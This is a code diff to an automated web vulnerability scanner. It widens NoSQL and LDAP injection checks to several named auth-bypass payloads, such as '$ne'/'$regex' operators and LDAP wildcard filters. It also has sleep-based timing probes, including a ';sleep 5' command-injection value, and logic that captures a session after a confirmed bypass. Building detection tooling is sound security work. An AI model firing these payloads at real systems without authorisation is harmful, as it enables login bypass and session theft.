@@ -936,9 +936,28 @@ def run_sqli_blind(
 # Canonical, best-effort injection primitives (stimulus only; the oracle, not the
 # payload, decides). Kept here, not in the corpus, because these drive a fixed
 # detector rather than the tagged-library chain.
-_NOSQL_BYPASS_VALUE = '{"$ne": null}'
+#
+# v2 W5 (widen candidate generation): several named operator-bypass variants are
+# tried in sequence per parameter, mirroring run_jwt_forgery's already-established
+# multi-variant pattern (_FORGED, above) — a WAF/input filter that strips one
+# operator ($ne) may not catch another ($regex/$exists), and a filter that blocks
+# one LDAP wildcard shape may miss another. Every variant still only ever produces
+# an oracle-confirmed Finding or nothing; this widens what's ATTEMPTED, never what
+# counts as proof.
+_NOSQL_BYPASS_VALUES: tuple[tuple[str, str], ...] = (
+    ('{"$ne": null}', "ne-null"),
+    ('{"$ne": ""}', "ne-empty"),
+    ('{"$gt": ""}', "gt-empty"),
+    ('{"$regex": ".*"}', "regex-wildcard"),
+    ('{"$exists": true}', "exists-true"),
+)
 _NOSQL_TIMING_VALUE = '{"$where": "sleep(5000)"}'
-_LDAP_BYPASS_VALUE = "*)(uid=*))(|(uid=*"
+_LDAP_BYPASS_VALUES: tuple[tuple[str, str], ...] = (
+    ("*)(uid=*))(|(uid=*", "wildcard-classic"),
+    ("*)(|(objectClass=*))", "objectclass-wildcard"),
+    ("admin)(&(password=*))", "admin-password-bypass"),
+    ("*)(|(cn=*))", "cn-wildcard"),
+)
 _LDAP_TIMING_VALUE = "*)(&(uid=*)(|(sleep=5)))"
 _CMD_TIMING_VALUE = ";sleep 5"
 _INJECTABLE_LOCATIONS = ("query", "path", "body")
@@ -1046,55 +1065,80 @@ def run_nosqli(
             status = result.status_code if result is not None else 0
             return Observation(label=label, status_code=status, body=body)
 
-        def fire_auth_bypass() -> AuthBypassProbe:
-            return AuthBypassProbe(
-                baseline=_obs("baseline", "benign"),
-                probe=_obs(_NOSQL_BYPASS_VALUE, "injected"),
-            )
+        def _no_timing_signal() -> TimingProbe:
+            # Identical latencies -> the statistical oracle can never confirm from
+            # this call, with no live delay probe fired at all (v2 W5): only the
+            # LAST bypass variant below actually exercises the real timing fallback,
+            # so trying several bypass variants doesn't multiply timing-flakiness
+            # risk or redundant network traffic.
+            return TimingProbe((50.0,) * _TIMING_TRIALS, (50.0,) * _TIMING_TRIALS)
 
-        def fire_timing() -> TimingProbe:
+        def _real_timing() -> TimingProbe:
             probe_ms, baseline_ms = _paired_timing(fire, _NOSQL_TIMING_VALUE)
             return TimingProbe(probe_ms, baseline_ms)
 
-        prober = NoSqliProber(
-            fire_auth_bypass=fire_auth_bypass, fire_timing=fire_timing, oracle_runner=seam.run
-        )
-        result = detect_nosqli(prober, evidence_ref=f"orchestrator/nosqli {ep.path} {param.name}")
-        if result.confirmed and seam.last is not None:
-            mech = result.mechanism.value if result.mechanism is not None else "unknown"
-            nid = seam.write("nosqli", seam.last, severity="high", metadata={"mechanism": mech})
-            if nid:
-                _emit(
-                    events,
-                    "payloads",
-                    "finding",
-                    f"nosqli via {mech}",
-                    path=ep.path,
-                    param=param.name,
+        # v2 W5: try several named operator-bypass variants in sequence — a WAF/
+        # input filter that strips one operator ($ne) may not catch another
+        # ($regex/$exists). First confirmation wins; the real timing fallback runs
+        # only once, on the final variant, if none of the bypasses confirmed.
+        for index, (bypass_value, variant_name) in enumerate(_NOSQL_BYPASS_VALUES):
+            is_last = index == len(_NOSQL_BYPASS_VALUES) - 1
+
+            def fire_auth_bypass(bypass_value: str = bypass_value) -> AuthBypassProbe:
+                return AuthBypassProbe(
+                    baseline=_obs("baseline", "benign"),
+                    probe=_obs(bypass_value, "injected"),
                 )
-                found.append(nid)
-                if (
-                    derived_identities is not None
-                    and result.bypass_identity_hint
-                    and last_bypass_result is not None
-                ):
-                    body_text = last_bypass_result.body.decode("utf-8", errors="replace")
-                    captured = capture_bypass_session(last_bypass_result, body_text)
-                    if captured is not None:
-                        derived_identities.append(
-                            DerivedIdentityLead(
-                                finding_id=nid,
-                                vuln_class="nosqli",
-                                role_hint=result.bypass_identity_hint,
-                                captured=captured,
+
+            prober = NoSqliProber(
+                fire_auth_bypass=fire_auth_bypass,
+                fire_timing=_real_timing if is_last else _no_timing_signal,
+                oracle_runner=seam.run,
+            )
+            result = detect_nosqli(
+                prober, evidence_ref=f"orchestrator/nosqli {ep.path} {param.name}:{variant_name}"
+            )
+            if result.confirmed and seam.last is not None:
+                mech = result.mechanism.value if result.mechanism is not None else "unknown"
+                nid = seam.write(
+                    "nosqli",
+                    seam.last,
+                    severity="high",
+                    metadata={"mechanism": mech, "variant": variant_name},
+                )
+                if nid:
+                    _emit(
+                        events,
+                        "payloads",
+                        "finding",
+                        f"nosqli via {mech} ({variant_name})",
+                        path=ep.path,
+                        param=param.name,
+                    )
+                    found.append(nid)
+                    if (
+                        derived_identities is not None
+                        and result.bypass_identity_hint
+                        and last_bypass_result is not None
+                    ):
+                        body_text = last_bypass_result.body.decode("utf-8", errors="replace")
+                        captured = capture_bypass_session(last_bypass_result, body_text)
+                        if captured is not None:
+                            derived_identities.append(
+                                DerivedIdentityLead(
+                                    finding_id=nid,
+                                    vuln_class="nosqli",
+                                    role_hint=result.bypass_identity_hint,
+                                    captured=captured,
+                                )
                             )
-                        )
+                break
         # Note: a non-confirm here is the NORMAL, expected outcome for a properly-secured
-        # parameter (auth-bypass differential + timing both ran and found nothing) — it is
-        # NOT a "suspected lead" and must not be recorded as one (that would flood the
-        # Suspected tier with every clean parameter on every scan). The Suspected tier is
-        # reserved for a genuine external assertion (a signal-gated tool's claim) that
-        # couldn't be reconfirmed — see `_make_signal_reconfirm`'s `_suspect` helper.
+        # parameter (every auth-bypass variant + timing all found nothing) — it is NOT a
+        # "suspected lead" and must not be recorded as one (that would flood the Suspected
+        # tier with every clean parameter on every scan). The Suspected tier is reserved
+        # for a genuine external assertion (a signal-gated tool's claim) that couldn't be
+        # reconfirmed — see `_make_signal_reconfirm`'s `_suspect` helper.
 
     for ep_node, ep in graph.endpoints():
         for _param_node, param in graph.parameters_of(ep_node):
@@ -1150,53 +1194,71 @@ def run_ldap(
             status = result.status_code if result is not None else 0
             return Observation(label=label, status_code=status, body=body)
 
-        def fire_auth_bypass() -> AuthBypassProbe:
-            return AuthBypassProbe(
-                baseline=_obs("baseline", "benign-bind"),
-                probe=_obs(_LDAP_BYPASS_VALUE, "wildcard-inject"),
-            )
+        def _no_timing_signal() -> TimingProbe:
+            # See run_nosqli's identical helper: identical latencies never confirm,
+            # with no live delay probe fired — only the final variant below
+            # exercises the real timing fallback (v2 W5).
+            return TimingProbe((50.0,) * _TIMING_TRIALS, (50.0,) * _TIMING_TRIALS)
 
-        def fire_timing() -> TimingProbe:
+        def _real_timing() -> TimingProbe:
             probe_ms, baseline_ms = _paired_timing(fire, _LDAP_TIMING_VALUE)
             return TimingProbe(probe_ms, baseline_ms)
 
-        prober = LdapiProber(
-            fire_auth_bypass=fire_auth_bypass, fire_timing=fire_timing, oracle_runner=seam.run
-        )
-        result = detect_ldapi(
-            prober, evidence_ref=f"orchestrator/ldap_injection {ep.path} {param.name}"
-        )
-        if result.confirmed and seam.last is not None:
-            mech = result.mechanism.value if result.mechanism is not None else "unknown"
-            nid = seam.write(
-                "ldap_injection", seam.last, severity="high", metadata={"mechanism": mech}
-            )
-            if nid:
-                _emit(
-                    events,
-                    "payloads",
-                    "finding",
-                    f"ldap injection via {mech}",
-                    path=ep.path,
-                    param=param.name,
+        # v2 W5: try several named wildcard/filter-injection variants in sequence —
+        # a filter that blocks one LDAP wildcard shape may miss another.
+        for index, (bypass_value, variant_name) in enumerate(_LDAP_BYPASS_VALUES):
+            is_last = index == len(_LDAP_BYPASS_VALUES) - 1
+
+            def fire_auth_bypass(bypass_value: str = bypass_value) -> AuthBypassProbe:
+                return AuthBypassProbe(
+                    baseline=_obs("baseline", "benign-bind"),
+                    probe=_obs(bypass_value, "wildcard-inject"),
                 )
-                found.append(nid)
-                if (
-                    derived_identities is not None
-                    and result.bypass_identity_hint
-                    and last_bypass_result is not None
-                ):
-                    body_text = last_bypass_result.body.decode("utf-8", errors="replace")
-                    captured = capture_bypass_session(last_bypass_result, body_text)
-                    if captured is not None:
-                        derived_identities.append(
-                            DerivedIdentityLead(
-                                finding_id=nid,
-                                vuln_class="ldap_injection",
-                                role_hint=result.bypass_identity_hint,
-                                captured=captured,
+
+            prober = LdapiProber(
+                fire_auth_bypass=fire_auth_bypass,
+                fire_timing=_real_timing if is_last else _no_timing_signal,
+                oracle_runner=seam.run,
+            )
+            result = detect_ldapi(
+                prober,
+                evidence_ref=f"orchestrator/ldap_injection {ep.path} {param.name}:{variant_name}",
+            )
+            if result.confirmed and seam.last is not None:
+                mech = result.mechanism.value if result.mechanism is not None else "unknown"
+                nid = seam.write(
+                    "ldap_injection",
+                    seam.last,
+                    severity="high",
+                    metadata={"mechanism": mech, "variant": variant_name},
+                )
+                if nid:
+                    _emit(
+                        events,
+                        "payloads",
+                        "finding",
+                        f"ldap injection via {mech} ({variant_name})",
+                        path=ep.path,
+                        param=param.name,
+                    )
+                    found.append(nid)
+                    if (
+                        derived_identities is not None
+                        and result.bypass_identity_hint
+                        and last_bypass_result is not None
+                    ):
+                        body_text = last_bypass_result.body.decode("utf-8", errors="replace")
+                        captured = capture_bypass_session(last_bypass_result, body_text)
+                        if captured is not None:
+                            derived_identities.append(
+                                DerivedIdentityLead(
+                                    finding_id=nid,
+                                    vuln_class="ldap_injection",
+                                    role_hint=result.bypass_identity_hint,
+                                    captured=captured,
+                                )
                             )
-                        )
+                break
         # Not recorded as Suspected: a non-confirm here is the expected, common outcome for
         # a properly-secured parameter, not a lead — see the matching note in run_nosqli.
 
